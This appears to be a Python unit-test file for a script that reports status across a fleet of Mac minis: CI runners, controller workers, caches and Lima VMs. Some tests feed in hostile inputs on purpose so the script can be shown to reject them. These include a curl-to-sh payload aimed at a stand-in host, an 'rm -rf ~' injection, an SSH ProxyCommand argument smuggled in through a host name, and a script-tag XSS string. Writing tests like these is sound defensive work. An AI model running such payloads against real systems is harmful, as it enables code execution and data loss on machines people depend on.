#!/usr/bin/env python3
"""Tests for scripts/glaeda-fleet-status. No network, no SSH: sources are fixtures."""
from __future__ import annotations

import contextlib
import importlib.machinery
import importlib.util
import io
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT = Path(__file__).resolve().parent / "glaeda-fleet-status"
loader = importlib.machinery.SourceFileLoader("glaeda_fleet_status", str(SCRIPT))
spec = importlib.util.spec_from_loader("glaeda_fleet_status", loader)
fs = importlib.util.module_from_spec(spec)
sys.modules["glaeda_fleet_status"] = fs
loader.exec_module(fs)

AT = 1_800_000_000


def src(data, at=AT - 30, error=None):
    return {"ok": error is None, "error": error, "observed_at": at, "data": data}


def manifest(**extra):
    hosts = {
        "mini-a": {"class": "m4pro-48", "roles": ["ci-runner", "dev-builds"], "hostname": "mini-a",
                   "node_id": "cmux-mini-a", "lima_expected": ["linux-base"]},
        "mini-b": {"class": "m4-16", "roles": ["dev-builds"], "hostname": "Mini-B", "node_id": None,
                   "lima_expected": []},
    }
    return src({"fleet": "test", "hosts": hosts, "never_touch": ["coordinator"], **extra})


def bundle(**sources):
    return {"schema": fs.SOURCES_SCHEMA, "collected_at": AT, "sources": {"manifest": manifest(), **sources}}


def build(**sources):
    return fs.build(bundle(**sources), at=AT)


def by_id(doc, prefix):
    return [f for f in doc["findings"] if f["id"].startswith(prefix)]


class ShapeTests(unittest.TestCase):
    def test_every_finding_has_a_typed_action_and_observation_time(self):
        doc = build(
            check=src({"issues": [
                {"host": "mini-a", "area": "xcode", "detail": "licence not accepted",
                 "fix": "sudo env DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer xcodebuild -license accept"},
                {"host": "mini-b", "area": "macos", "detail": "below floor", "fix": "update macOS"},
                {"host": "mini-b", "area": "reach", "detail": "timed out", "fix": ""},
            ], "observed_at": {"mini-a": AT - 10, "mini-b": AT - 20}}),
            controller=src({"workers": [{"host": "mini-a.local", "state": "stale", "action": "check worker"}]}),
        )
        self.assertEqual(doc["schema"], fs.SCHEMA)
        self.assertTrue(doc["findings"])
        for f in doc["findings"]:
            a = f["action"]
            self.assertEqual(set(a), {"id", "who", "safe_to_apply", "command", "note"})
            self.assertIn(a["who"], fs.WHO)
            self.assertIsInstance(a["safe_to_apply"], bool)
            if a["safe_to_apply"]:
                self.assertIsNotNone(a["command"])
            self.assertIn(f["severity"], fs.SEVERITIES)
            self.assertIsNotNone(f["observed_at"])

    def test_sudo_fix_is_a_password_command_run_over_ssh_with_a_tty(self):
        doc = build(check=src({"issues": [
            {"host": "mini-a", "area": "xcode", "detail": "licence not accepted", "fix": "sudo xcodebuild -license accept"}],
            "observed_at": {}}))
        [f] = by_id(doc, "check.xcode@mini-a")
        self.assertEqual(f["action"]["who"], "password")
        self.assertFalse(f["action"]["safe_to_apply"])
        self.assertEqual(f["action"]["command"], "ssh -t -- mini-a 'sudo xcodebuild -license accept'")

    def test_prose_fix_goes_to_a_person_as_a_note_not_a_command(self):
        doc = build(check=src({"issues": [{"host": "mini-b", "area": "macos", "detail": "old", "fix": "update macOS"}],
                               "observed_at": {}}))
        [f] = by_id(doc, "check.macos@mini-b")
        self.assertEqual(f["action"]["who"], "person")
        self.assertIsNone(f["action"]["command"])
        self.assertEqual(f["action"]["note"], "update macOS")

    def test_typed_apply_actions_are_never_safe(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "xcode", "detail": "missing", "fix": "clone",
                                           "action": {"kind": "clone_xcode", "path": "/Applications/X.app"}}],
                               "observed_at": {}}))
        [f] = by_id(doc, "check.xcode@mini-a")
        self.assertEqual(f["action"]["id"], "clone_xcode")
        self.assertFalse(f["action"]["safe_to_apply"])
        self.assertIn("glaeda-mini-fleet apply --host mini-a --yes", f["action"]["command"])


class JoinTests(unittest.TestCase):
    def test_controller_rows_map_by_hostname_and_unknown_hosts_are_findings(self):
        doc = build(controller=src({"workers": [
            {"host": "Mini-B.local", "state": "ready", "busy": False, "free_gib": 200},
            {"host": "mini-z", "state": "ready"},
        ]}))
        member = next(m for m in doc["members"] if m["name"] == "mini-b")
        self.assertEqual(member["controller"]["state"], "ready")
        self.assertEqual(member["status"], "ok")
        [f] = by_id(doc, "controller.unknown_member")
        self.assertIn("mini-z", f["summary"])

    def test_stale_worker_is_an_error_for_a_person(self):
        doc = build(controller=src({"workers": [{"host": "mini-a", "state": "stale", "action": "x"}]}))
        [f] = by_id(doc, "controller.stale@mini-a")
        self.assertEqual((f["severity"], f["action"]["who"]), ("error", "person"))
        self.assertEqual(next(m for m in doc["members"] if m["name"] == "mini-a")["status"], "broken")

    def test_runner_suffix_names_map_to_members_and_offline_is_an_error(self):
        doc = build(runners=src({"runners": [
            {"name": "mini-a-ci2", "status": "offline", "busy": False, "labels": ["self-hosted", "macOS"]},
            {"name": "blacksmith-1", "status": "online", "busy": True, "labels": ["blacksmith"]},
        ]}))
        member = next(m for m in doc["members"] if m["name"] == "mini-a")
        self.assertEqual(member["runners"][0]["name"], "mini-a-ci2")
        [f] = by_id(doc, "runners.offline:mini-a-ci2@mini-a")
        self.assertTrue(f["action"]["safe_to_apply"])  # read-only launchctl listing
        self.assertFalse(by_id(doc, "runners.unknown_member"))

    def test_ci_runner_role_without_a_runner_is_missing(self):
        doc = build(runners=src({"runners": []}))
        [f] = by_id(doc, "runners.missing@mini-a")
        self.assertEqual(f["action"]["who"], "person")
        self.assertFalse(by_id(doc, "runners.missing@mini-b"))

    def test_queued_job_without_an_eligible_online_runner_names_who_should_take_it(self):
        doc = build(
            runners=src({"runners": [
                {"name": "mini-a", "status": "offline", "busy": False,
                 "labels": ["self-hosted", "macOS", "ARM64", "glaeda-mini"]}]}),
            queue=src({"jobs": [
                {"repo": "o/r", "run_id": 1, "job_id": 2, "name": "build",
                 "labels": ["self-hosted", "glaeda-mini"], "created_at": "2026-09-24T00:00:00Z"},
                {"repo": "o/r", "run_id": 1, "job_id": 3, "name": "lint", "labels": ["ubuntu-latest"]},
            ]}),
        )
        [f] = by_id(doc, "queue.no_eligible_runner")
        self.assertIsNone(f["member"])
        self.assertIn("glaeda-mini,self-hosted", f["summary"])
        self.assertIn("should have taken it: mini-a", f["summary"])

    def test_queued_job_with_an_online_runner_is_not_a_finding(self):
        doc = build(
            runners=src({"runners": [{"name": "mini-a", "status": "online", "busy": True,
                                      "labels": ["self-hosted", "glaeda-mini"]}]}),
            queue=src({"jobs": [{"labels": ["self-hosted", "glaeda-mini"]}]}),
        )
        self.assertFalse(by_id(doc, "queue."))

    def test_cache_and_lima(self):
        doc = build(
            cache=src({"endpoints": [{"name": "t5", "reachable": True, "healthy": False, "http_status": 503,
                                      "observed_at": AT - 5}]}),
            lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "observed_at": AT - 5, "instances": [
                {"name": "linux-base", "status": "Stopped"},
                {"name": "clone-7", "status": "Stopped"},
                {"name": "clone-8", "status": "Running"}]}}}),
        )
        [cache] = by_id(doc, "cache.unhealthy:t5")
        self.assertEqual(cache["severity"], "error")
        member = next(m for m in doc["members"] if m["name"] == "mini-a")
        self.assertEqual(member["lima"], {"reachable": True, "installed": True, "total": 3, "running": 1,
                                          "orphans": ["clone-7"]})
        [orphan] = by_id(doc, "lima.orphan:clone-7@mini-a")
        self.assertFalse(orphan["action"]["safe_to_apply"])  # deleting a VM is never safe

    def test_check_and_preflight_naming_the_same_command_collapse(self):
        cmd = "sudo pmset -c sleep 0"
        doc = build(
            check=src({"issues": [{"host": "mini-a", "area": "power", "detail": "sleeps", "fix": cmd}],
                       "observed_at": {}}),
            preflight=src({"hosts": {"mini-a": {"ready": False, "checks": {
                "power": {"state": "fail", "detail": "sleeps on AC", "fix": cmd, "group": "password"}}}},
                "observed_at": {}}),
        )
        power = [f for f in doc["findings"] if f["member"] == "mini-a" and f["action"]["command"]
                 and "pmset" in f["action"]["command"]]
        self.assertEqual(len(power), 1)
        self.assertEqual(power[0]["also"], ["preflight.power@mini-a"])


class LiveDataTests(unittest.TestCase):
    """Cases the first run against the real fleet surfaced."""

    def crossed(self):
        # SSH name mini-5's hostname is another member's SSH name, as on the Manaflow minis.
        hosts = {"mini-4": {"class": "c", "roles": [], "hostname": "mini-5", "node_id": None, "lima_expected": []},
                 "mini-5": {"class": "c", "roles": [], "hostname": "mini-4", "node_id": None, "lima_expected": []}}
        return {"manifest": src({"hosts": hosts, "never_touch": []})}

    def test_member_names_win_over_crossed_hostnames(self):
        sources = self.crossed()
        sources["preflight"] = src({"hosts": {"mini-5": {"ready": False, "checks": {
            "zig": {"state": "fail", "detail": "old", "fix": "brew install zig", "group": "self"}}}},
            "observed_at": {"mini-5": AT - 1}})
        doc = fs.build({"schema": fs.SOURCES_SCHEMA, "sources": sources}, at=AT)
        [f] = by_id(doc, "preflight.zig")
        self.assertEqual(f["member"], "mini-5")
        self.assertEqual(f["action"]["command"], "ssh -- mini-5 'brew install zig'")

    def test_a_member_without_issues_still_records_when_it_was_observed(self):
        doc = build(check=src({"issues": [], "observed_at": {"mini-a": AT - 3, "mini-b": AT - 4}}))
        self.assertEqual({m["name"]: m["status"] for m in doc["members"]}["mini-b"], "ok")

    def test_onboarding_blockers_are_warnings_not_breakage(self):
        doc = build(preflight=src({"hosts": {"mini-a": {"ready": False, "checks": {
            "brew": {"state": "fail", "detail": "none", "fix": "install Homebrew (https://brew.sh)", "group": "person"},
            "rust": {"state": "unknown", "detail": "?", "fix": "", "group": ""},
            "runner": {"state": "todo", "detail": "none", "fix": "later", "group": "person"}}}},
            "observed_at": {"mini-a": AT - 1}}))
        severities = {f["code"]: f["severity"] for f in doc["findings"]}
        self.assertEqual(severities, {"brew": "warn", "runner": "info"})  # rust unknown does not block
        self.assertEqual(next(m for m in doc["members"] if m["name"] == "mini-a")["status"], "attention")

    def test_env_prefixed_fix_is_a_command(self):
        fix = "DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer xcodebuild -downloadComponent MetalToolchain"
        doc = build(preflight=src({"hosts": {"mini-a": {"ready": False, "checks": {
            "metal": {"state": "fail", "detail": "missing", "fix": fix, "group": "self"}}}}, "observed_at": {}}))
        [f] = by_id(doc, "preflight.metal@mini-a")
        self.assertEqual((f["action"]["who"], f["action"]["safe_to_apply"]), ("agent", False))
        self.assertIn("downloadComponent", f["action"]["command"])

    def test_fixes_that_mix_command_and_prose_are_notes(self):
        for fix in ("sudo -u admin brew install rustup; link its cargo, rustc and rustup proxies into /opt/homebrew/bin",
                    "brew install zig (or brew upgrade zig); /opt/homebrew/bin comes first on the workload PATH",
                    "cd ~/cmux && rustup default stable (or rustup toolchain install <its channel>)",
                    "install Homebrew, then brew install zig"):
            self.assertIsNone(fs.as_command(fix), fix)
        for fix in ("git clone https://x/glaeda.git ~/glaeda; ~/glaeda/scripts/glaeda-mini-setup --apply",
                    "cd ~/cmux && git submodule update --init --recursive --depth 1",
                    "sudo pmset -c sleep 0"):
            self.assertEqual(fs.as_command(fix), fix)

    def test_truncated_runner_list_does_not_claim_missing_runners(self):
        doc = build(runners=src({"runners": [], "truncated": True}))
        self.assertFalse(by_id(doc, "runners.missing"))
        self.assertTrue(by_id(doc, "runners.truncated@fleet"))


class ReviewTests(unittest.TestCase):
    """Regressions from the independent review of PR 1168."""

    def test_an_oversized_member_field_cannot_push_errors_out(self):
        doc = build(controller=src({"workers": [{"host": "mini-a", "state": "stale", "free_gib": "9" * 700_000,
                                                 "busy": "x" * 1000}]}))
        self.assertLessEqual(len(fs.canonical(doc)), fs.MAX_DOCUMENT_BYTES)
        self.assertTrue(by_id(doc, "controller.stale@mini-a"))
        ctl = next(m for m in doc["members"] if m["name"] == "mini-a")["controller"]
        self.assertEqual((ctl["free_gib"], ctl["busy"]), (None, False))

    def test_counts_match_the_findings_that_survive(self):
        issues = [{"host": "mini-a", "area": f"a{i}", "detail": "d", "fix": "x"} for i in range(900)]
        doc = build(check=src({"issues": issues, "observed_at": {}}))
        self.assertEqual(sum(doc["fleet"]["findings"].values()), len(doc["findings"]))
        self.assertEqual(sum(m["counts"]["warn"] for m in doc["members"]), doc["fleet"]["findings"]["warn"])

    def test_prose_that_starts_like_a_command_is_a_note(self):
        for fix in ("glaeda-disk on the host shows where it went",
                    "cd ~/cmux && ./scripts/setup.sh (after metal and zig pass)"):
            self.assertIsNone(fs.as_command(fix), fix)

    def test_shell_syntax_from_a_probe_never_becomes_a_command(self):
        for fix in ("rustup toolchain install stable$(curl -s evil.example|sh)", "git status\nrm -rf ~",
                    "cd ~/cmux && rustup default `id`", "brew install zig > /tmp/x", "git log | sh"):
            self.assertIsNone(fs.as_command(fix), fix)

    def test_secrets_and_home_paths_withhold_the_command(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "git", "detail": "clone",
                                           "fix": "git clone https://ghp_" + "a" * 30 + "@github.com/a/b /Users/leo/x"}],
                               "observed_at": {}}))
        text = json.dumps(doc)
        self.assertNotIn("ghp_a", text)
        self.assertNotIn("/Users/leo", text)
        [f] = by_id(doc, "check.git@mini-a")
        self.assertEqual((f["action"]["who"], f["action"]["command"]), ("person", None))

    def test_queue_is_not_judged_without_a_fresh_complete_runner_list(self):
        job = {"labels": ["self-hosted", "macOS"]}
        for runners in (None, src(None, error="HTTP 403"), src({"runners": []}, at=AT - 5000),
                        src({"runners": [], "truncated": True})):
            sources = {"queue": src({"jobs": [job]})}
            if runners is not None:
                sources["runners"] = runners
            doc = build(**sources)
            self.assertFalse(by_id(doc, "queue.no_eligible_runner"), runners)
            self.assertTrue(by_id(doc, "queue.unjudged@fleet"), runners)

    def test_an_online_runner_outside_the_fleet_serves_the_queue(self):
        doc = build(runners=src({"runners": [{"name": "someone-elses-mac", "status": "online", "busy": False,
                                              "labels": ["self-hosted", "macOS"]}]}),
                    queue=src({"jobs": [{"labels": ["self-hosted", "macOS"]}]}))
        self.assertFalse(by_id(doc, "queue."))

    def test_malformed_bundles_fail_cleanly(self):
        for sources in ({"check": src(["not", "an", "object"])},
                        {"lima": src({"hosts": {"mini-a": {"reachable": True, "instances": [{"status": "Stopped"}]}}})},
                        {"controller": src({"workers": []}, at="yesterday")},
                        {"runners": src({"runners": [None, {"name": 3, "labels": [None]}]})}):
            try:
                doc = build(**sources)
            except fs.Failure:
                continue
            self.assertEqual(doc["schema"], fs.SCHEMA)

    def test_two_offline_runners_on_one_member_are_two_findings(self):
        doc = build(runners=src({"runners": [{"name": "mini-a-1", "status": "offline", "labels": []},
                                             {"name": "mini-a-2", "status": "offline", "labels": []}]}))
        self.assertEqual(len(by_id(doc, "runners.offline")), 2)

    def test_several_stale_sources_stay_separate(self):
        doc = build(controller=src({"workers": []}, at=AT - 5000), cache=src({"endpoints": []}, at=AT - 5000))
        self.assertEqual(len([f for f in doc["findings"] if f["code"] == "stale"]), 2)

    def test_hosts_outside_the_manifest_get_no_ssh_command(self):
        doc = build(check=src({"issues": [{"host": "-oProxyCommand=touch /tmp/pwn", "area": "git",
                                           "detail": "x", "fix": "git status"}], "observed_at": {}}))
        self.assertFalse([f for f in doc["findings"] if f["action"]["command"]])
        self.assertTrue(by_id(doc, "check.unknown_member@fleet"))
        self.assertIsNone(fs.remote("-oProxyCommand=x", "true"))

    def test_lima_names_are_validated_before_they_reach_a_command(self):
        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "instances": [
            {"name": "ok-1", "status": "Stopped"}, {"name": "-rf", "status": "Stopped"},
            {"name": "nostatus", "status": ""}]}}}))
        commands = [f["action"]["command"] for f in by_id(doc, "lima.orphan")]
        self.assertEqual(sorted(c for c in commands if c), ["ssh -- mini-a 'limactl delete -- ok-1'"])
        self.assertEqual(len(commands), 2)  # an instance with no status is not an orphan

    def test_glaeda_disk_is_not_marked_safe(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "disk", "detail": "low", "fix": "glaeda-disk"}],
                               "observed_at": {}}))
        [f] = by_id(doc, "check.disk@mini-a")
        self.assertFalse(f["action"]["safe_to_apply"])


class SafetyTests(unittest.TestCase):
    def test_never_touch_members_get_no_command_and_no_agent(self):
        doc = build(controller=src({"workers": [{"host": "coordinator", "state": "below CMUX start floor"}]}))
        [f] = by_id(doc, "controller.below_cmux_start_floor@coordinator")
        self.assertEqual(f["action"]["who"], "person")
        self.assertIsNone(f["action"]["command"])
        self.assertFalse(f["action"]["safe_to_apply"])
        self.assertIn("never_touch", f["action"]["note"])
        self.assertTrue(next(m for m in doc["members"] if m["name"] == "coordinator")["never_touch"])

    def test_secrets_and_home_paths_never_reach_the_document(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "worker",
                                           "detail": "token=abc123 ghp_" + "x" * 30 + " in /Users/alice/secret",
                                           "fix": "provision secrets"}], "observed_at": {}}))
        text = json.dumps(doc)
        self.assertNotIn("abc123", text)
        self.assertNotIn("ghp_x", text)
        self.assertNotIn("alice", text)

    def test_stale_and_unavailable_sources_are_findings(self):
        doc = build(controller=src({"workers": []}, at=AT - 5000),
                    runners=src(None, error="gh api: HTTP 403"))
        self.assertEqual(doc["sources"]["controller"]["state"], "stale")
        self.assertEqual(doc["sources"]["runners"]["state"], "unavailable")
        self.assertEqual(doc["sources"]["queue"]["state"], "not_collected")
        [stale] = by_id(doc, "controller.stale@fleet")
        self.assertTrue(stale["action"]["safe_to_apply"])
        self.assertEqual(stale["action"]["command"], "glaeda-fleet-status")
        self.assertTrue(by_id(doc, "runners.unavailable@fleet"))

    def test_output_stays_bounded(self):
        instances = [{"name": f"clone-{i}", "status": "Stopped"} for i in range(5000)]
        issues = [{"host": "mini-a", "area": f"a{i}", "detail": "d" * 5000, "fix": "x"} for i in range(2000)]
        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "instances": instances}}}),
                    check=src({"issues": issues, "observed_at": {}}))
        self.assertLessEqual(len(doc["findings"]), fs.MAX_FINDINGS)
        self.assertGreater(doc["fleet"]["truncated_findings"], 0)
        self.assertLessEqual(len(fs.canonical(doc)), fs.MAX_DOCUMENT_BYTES)
        self.assertTrue(all(len(f["summary"]) <= fs.MAX_TEXT for f in doc["findings"]))
        self.assertLessEqual(len(next(m for m in doc["members"] if m["name"] == "mini-a")["lima"]["orphans"]), 16)

    def test_rejects_a_foreign_bundle(self):
        with self.assertRaises(fs.Failure):
            fs.build({"schema": "other"}, at=AT)


class RenderTests(unittest.TestCase):
    def test_html_escapes_everything_and_comes_from_the_same_document(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "xcode",
                                           "detail": "<script>alert(1)</script>", "fix": "x"}], "observed_at": {}}))
        page = fs.render_html(doc)
        self.assertNotIn("<script>", page)
        self.assertIn("&lt;script&gt;", page)
        self.assertIn("prefers-color-scheme:dark", page)
        text = fs.render_text(doc)
        self.assertIn("mini-a", text)

    def test_cli_build_then_render_round_trip(self):
        with tempfile.TemporaryDirectory() as tmp:
            sources = Path(tmp) / "sources.json"
            status = Path(tmp) / "status.json"
            page = Path(tmp) / "status.html"
            sources.write_text(json.dumps(bundle(controller=src({"workers": [{"host": "mini-a", "state": "stale"}]},
                                                                at=fs.now()))))
            with contextlib.redirect_stdout(io.StringIO()):
                code = fs.main(["build", str(sources), "--out", str(status), "--output", "json"])
            self.assertEqual(code, 1)  # the stale worker is an error
            doc = json.loads(status.read_text())
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(fs.main(["render", str(status), "--html", str(page)]), 1)
            self.assertIn("mini-a", page.read_text())
            self.assertEqual(doc["schema"], fs.SCHEMA)

    def test_cli_errors_exit_2(self):
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(fs.main(["build"]), 2)
            self.assertEqual(fs.main(["status", "--github-runners", "users/x"]), 2)


class CollectTests(unittest.TestCase):
    def test_lima_parses_instances_and_reports_missing_limactl(self):
        listing = '{"name":"a","status":"Running"}\n{"name":"b","status":"Stopped"}\n'
        with mock.patch.object(fs.subprocess, "run", return_value=subprocess.CompletedProcess([], 0, listing, "")):
            row = fs.lima_host("mini-a", "builder")
        self.assertEqual([i["name"] for i in row["instances"]], ["a", "b"])
        with mock.patch.object(fs.subprocess, "run",
                               return_value=subprocess.CompletedProcess([], 0, '{"no_lima":true}\n', "")):
            self.assertFalse(fs.lima_host("mini-a", "builder")["installed"])

    def test_lima_skips_never_touch_hosts(self):
        seen = []
        with mock.patch.object(fs, "lima_host", side_effect=lambda h, u: seen.append(h) or {"reachable": True}):
            fs.collect_lima({"ssh_user": "builder", "never_touch": ["coordinator"]}, ["mini-a", "coordinator"])
        self.assertEqual(seen, ["mini-a"])

    def test_child_env_is_allowlisted(self):
        with mock.patch.dict(fs.os.environ, {"AWS_SECRET_ACCESS_KEY": "x", "HOME": "/h"}, clear=True):
            self.assertEqual(fs.child_env(), {"HOME": "/h"})

    def test_cache_spec_must_be_name_equals_url(self):
        with self.assertRaises(fs.Failure):
            fs.collect_cache(["t5"])


if __name__ == "__main__":
    unittest.main()
